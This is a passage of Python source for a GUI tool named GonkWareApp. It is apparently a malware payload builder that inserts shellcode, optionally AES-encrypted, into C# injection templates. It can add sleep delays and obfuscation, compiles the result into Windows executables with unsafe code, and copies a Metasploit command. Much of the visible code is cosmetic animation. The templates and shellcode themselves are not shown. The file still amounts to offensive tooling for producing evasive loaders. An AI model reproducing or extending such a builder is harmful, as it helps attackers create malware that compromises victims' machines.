        resized = self.right_bg_original.resize((event.width, event.height))
        self.right_bg_image = ImageTk.PhotoImage(resized)
        self.right_bg_label.configure(image=self.right_bg_image)
        self.right_bg_label.image = self.right_bg_image

    def start_marquee(self):
        text = self.full_msf_cmd
        if len(text) <= 15:
            return

        # Cancel previous marquee if it exists
        if self.marquee_job:
            self.root.after_cancel(self.marquee_job)
            self.marquee_job = None 

        def scroll(index=0):
            display_text = text[index:] + "   " + text[:index]
            self.msf_entry.configure(state="normal")
            self.msf_entry.delete("1.0", tb.END)
            visible_text = display_text[:35]
            if " " in visible_text:
                visible_text = visible_text.rsplit(" ", 1)[0]
            self.update_msf_entry(visible_text)


            next_index = (index + 1) % len(text)
            self.marquee_job = self.root.after(150, lambda: scroll(next_index))

        scroll()

    def on_sleep_duration_change(self, *args):
        if self.sleep_checkbox_var.get():
            if self.aes_checkbox_var.get():
                self.toggle_aes_encryption()
            else:
                self.toggle_sleep_option()

    # Add a method to retrieve the correct JSON template based on selected technique
    def get_selected_template(self):
        """Retrieve the correct JSON template based on selected technique."""
        technique_key = self.selected_technique.get()  # Match JSON keys
        selected_template = self.template_data.get(technique_key, {})
        
        return selected_template

    def start_glitch_animation(self, img_path=None, interval=240):
        if hasattr(self, "glitch_job"):
            self.stop_glitch_animation()

        png_files = glob.glob("media/*.png")
        if not png_files:
            return

        base_image = Image.open(img_path) if img_path else Image.open(random.choice(png_files))
        base_image = base_image.resize((64, 64))

        def glitch_loop(step=0):
            if not getattr(self, "glitch_running", False):
                return

            glitched = self.apply_glitch_effect(base_image.copy())
            tk_img = ImageTk.PhotoImage(glitched)
            self.loading_image_label.configure(image=tk_img)
            self.loading_image_label.image = tk_img
            self.loading_image_label.place(relx=0.5, rely=0.90, anchor="s")

            self.glitch_job = self.root.after(interval, glitch_loop)

        self.glitch_running = True
        glitch_loop()

    def stop_glitch_animation(self):
        self.glitch_running = False
        if hasattr(self, "glitch_job") and self.glitch_job:
            self.root.after_cancel(self.glitch_job)
            self.glitch_job = None
        self.loading_image_label.place_forget()

    def apply_glitch_effect(self, img):
        img = img.convert("RGB")
        glitch_type = random.choice(["flip", "shift", "tint", "slice", "zoom"])
        if glitch_type == "flip":
            img = img.transpose(Image.FLIP_LEFT_RIGHT if random.random() > 0.5 else Image.FLIP_TOP_BOTTOM)
        elif glitch_type == "shift":
            dx, dy = random.randint(-10, 10), random.randint(-10, 10)
            img = img.transform(img.size, Image.AFFINE, (1, 0, dx, 0, 1, dy))
        elif glitch_type == "tint":
            r, g, b = img.split()
            tint_channel = random.choice([r, g, b]).point(lambda p: p * random.uniform(0.5, 1.5))
            img = Image.merge("RGB", (r, g, tint_channel))
        elif glitch_type == "slice":
            pixels = img.load()
            width, height = img.size
            for y in range(0, height, 4):
                offset = random.randint(-5, 5)
                for x in range(width):
                    if 0 <= x + offset < width:
                        pixels[x, y] = pixels[(x + offset) % width, y]
        elif glitch_type == "zoom":
            w, h = img.size
            left = random.randint(0, w // 4)
            top = random.randint(0, h // 4)
            right = random.randint(3 * w // 4, w)
            bottom = random.randint(3 * h // 4, h)
            zoom_area = img.crop((left, top, right, bottom))
            img = zoom_area.resize((w, h))
        return img

    def build_final_script(
        self,
        template,
        shellcode=None,
        aes_data=None,
        inject_sleep=False,
        sleep_duration=5000,
        obfuscate=False
    ):
        directives = "\n".join(template.get("directives", []))
        function_declarations = "\n    ".join(template.get("function_declarations", []))
        constant_declarations = "\n    ".join(template.get("constant_declarations", []))
        function_definitions = "\n    ".join(template.get("function_definitions", [])) if "function_definitions" in template else ""

        code_blocks = template.get("code_blocks", {})
        code_lines = []

        for key, block in code_blocks.items():
            code_lines.append(f"    // --- {key.replace('_', ' ').title()} ---")
            code_lines.extend(f"    {line}" for line in block)
            code_lines.append("")

        code = "\n".join(code_lines)

        if aes_data:
            code = code.replace("ENCRYPTED_SHELLCODE_B64", aes_data["b64_shellcode"])
            code = code.replace("AES_KEY_B64", aes_data["b64_key"])
            code = code.replace("AES_IV_B64", aes_data["b64_iv"])
        elif shellcode:
            code = code.replace("PLACEHOLDER_SHELLCODE", shellcode)

        if inject_sleep:
            code, directives, function_declarations = self.inject_sleep_code(
                code, directives, function_declarations, sleep_duration
            )

        final_script = f"""
    {directives}
    class Program
    {{
        {function_declarations}
        {constant_declarations}
        static void Main()
        {{
    {code}
        }}
        {function_definitions}
    }}
    """
        
        if obfuscate:
            final_script = self.apply_obfuscation(final_script)

        return final_script.strip()

    def build_exe_from_output(self):
        full_output = self.output_text.get("1.0", tb.END).strip()

        # Remove trailing compiler status messages
        source_code_lines = full_output.splitlines()
        clean_code_lines = [line for line in source_code_lines if not line.strip().startswith("[!") and not line.strip().startswith("[+")]
        source_code = "\n".join(clean_code_lines)

        if not source_code:
            self.output_text.configure(state="normal")
            self.output_text.delete("1.0", tb.END)
            self.output_text.insert(tb.END, "\n[!] No C# code to compile.\n")
            self.output_text.configure(state="disabled")
            return

        # Create dynamic filename based on selected options
        technique = self.selected_technique.get().replace(" ", "").lower()
        fmt = self.selected_format.get().lower()
        arch = self.architecture.get().lower()
        payload = self.payload_type.get().lower()
        connection = self.selected_connection.get().lower()
        interface = self.selected_interface.get().lower().replace("/", "_")
        port = self.port.get()

        filename = f"{technique}_{fmt}_{arch}_{payload}_{connection}_{interface}_{port}.exe"

        # Ensure output directory exists
        os.makedirs("output", exist_ok=True)

        source_path = f"output/{filename.replace('.exe', '.cs')}"
        exe_path = f"output/{filename}"

        with open(source_path, "w") as f:
            f.write(source_code)

        # Get architecture from radio button selection
        arch = self.architecture.get()

        # Construct the compile command dynamically based on arch
        compile_cmd = f"mcs -out:{exe_path} " \
                    f"-platform:{arch} " \
                    "-unsafe " \
                    "-target:exe " \
                    "-reference:System.dll,System.Core.dll " \
                    f"{source_path} > /dev/null 2>&1"

        try:
            subprocess.check_output(compile_cmd, shell=True, stderr=subprocess.STDOUT, text=True)
  
            self.top_status_label.config(text=f"EXE Built!", foreground="#00ff00")
            #self.bottom_status_label.config(text=f"{exe_path}", foreground="#00ff00", font=("Consolas", 9, "italic"))
            self.bottom_status_label.config(text="see output", foreground="#00ff00", font=("Consolas", 12, "italic"))

            self.flicker_widget(self.top_status_label, "#00ff00", "#2e2e2e", final_color="#00ff00")
            self.open_folder_button.pack(pady=5, padx=10, anchor="se")
            self.flicker_widget(self.open_folder_button, "#91ddd3", "#ec1c3a", final_color="#91ddd3")

        except subprocess.CalledProcessError as e:
            self.top_status_label.config(text="Build failed", foreground="#ff5555")
            self.flicker_widget(self.top_status_label, "#ff0000", "#1f1f1f", steps=4, interval=60, final_color="#ec1c3a")

    def update_generation_state(
        self,
        enabled=True,
        top_text=None,
        bottom_text=None,
        color=None
    ):
        state = tb.NORMAL if enabled else tb.DISABLED

        # Update button states
        self.root.after(0, lambda: self.build_button.config(state=state))
        self.root.after(0, lambda: self.copy_button.config(state=state))
        self.root.after(0, lambda: self.generate_button.config(state=state))

        # Use custom text if provided, otherwise default
        status_text = top_text if top_text else ("Idle" if enabled else "Generating")
        bottom_status = bottom_text if bottom_text else ("Ready" if enabled else "Shellcode")
        status_color = color if color else ("#91ddd3" if enabled else "#FEFE00")

        self.root.after(0, lambda: self.top_status_label.config(
            text=status_text,
            foreground=status_color
        ))

        self.root.after(0, lambda: self.bottom_status_label.config(
            text=bottom_status,
            foreground=status_color
        ))

    def copy_msf_command(self):
        cmd = getattr(self, "full_msf_cmd", "No command yet")
        pyperclip.copy(cmd)

        # Set temporary status messages
        self.top_status_label.config(text="Command", foreground="#fefe00")
        self.bottom_status_label.config(text="Copied!", foreground="#fefe00")

        def blink_status(step=0):
            if step < 6:
                color = "#fefe00" if step % 2 == 0 else "#2e2e2e"
                self.top_status_label.config(foreground=color)
                self.bottom_status_label.config(foreground=color)
                self.root.after(200, lambda: blink_status(step + 1))
            else:
                # Restore original messages and colors
                self.top_status_label.config(text="Shellcode", foreground="#00ff00")
                self.bottom_status_label.config(text="Generated", foreground="#00ff00")

        blink_status()

    def apply_hover_effect(self, widget, style_name=None, var=None):
        style = tb.Style()
        style_name = style_name or widget.cget("style") or "TRadiobutton"

        def on_enter(e):
            style.configure(style_name, foreground="#91ddd3")

        def on_leave(e):
            style.configure(style_name, foreground="#ec1c3a")

        def flicker(step=0):
            if step < 6:
                flicker_color = "#91ddd3" if step % 2 == 0 else "#ec1c3a"
                style.configure(style_name, foreground=flicker_color)
                widget._flicker_job = self.root.after(100, lambda: flicker(step + 1))
            else:
                style.configure(style_name, foreground="#ec1c3a")
                widget._flicker_job = None

        if var:
            def on_var_change(*_):
                if widget.cget("value") == var.get():
                    flicker()
            var.trace_add("write", on_var_change)

        widget.bind("<Enter>", on_enter)
        widget.bind("<Leave>", on_leave)

    def update_msf_entry(self, text, fg="#000000", bg="#FEFE00", insert_bg="#000000"):
        self.msf_entry.configure(
            state="normal",
            foreground=fg,
            background=bg,
            insertbackground=insert_bg
        )
        self.msf_entry.delete("1.0", tb.END)
        self.msf_entry.insert("1.0", text)
        self.msf_entry.configure(state="disabled")
        self.msf_entry.tag_add("left", "1.0", "end")

    def flicker_widget(self, widget, color1, color2, steps=6, interval=100, final_color=None):
        style_name = widget.cget("style") or "TButton"
        style = tb.Style()

        def flicker(step=0):
            if step < steps:
                color = color1 if step % 2 == 0 else color2
                style.map(style_name, foreground=[('', color)])
                self.root.after(interval, lambda: flicker(step + 1))
            else:
                style.map(style_name, foreground=[('', final_color or "#91ddd3")])

        flicker()

    def flicker_style(self, style_name, color1, color2, steps=6, interval=80, final_color=None):
        style = tb.Style()
        def flicker(step=0):
            if step < steps:
                color = color1 if step % 2 == 0 else color2
                style.configure(style_name, foreground=color)
                self.root.after(interval, lambda: flicker(step + 1))
            elif final_color:
                style.configure(style_name, foreground=final_color)
        flicker()

    def load_template(self, path, key=None):
        if not os.path.exists(path):
            print(f"[!] Template file not found: {path}")
            return {}

        with open(path, "r") as f:
            data = json.load(f)
            return data.get(key, data) if key else data

    def open_output_folder(self):
        output_path = os.path.abspath("output")
        if os.name == 'nt':  # Windows
            os.startfile(output_path)
        elif os.name == 'posix':  # Linux/Mac
            subprocess.Popen(['xdg-open', output_path])

    def on_exit(self):
        self.root.destroy()

if __name__ == "__main__":
    root = tb.Window()
    app = GonkWareApp(root)
    root.mainloop()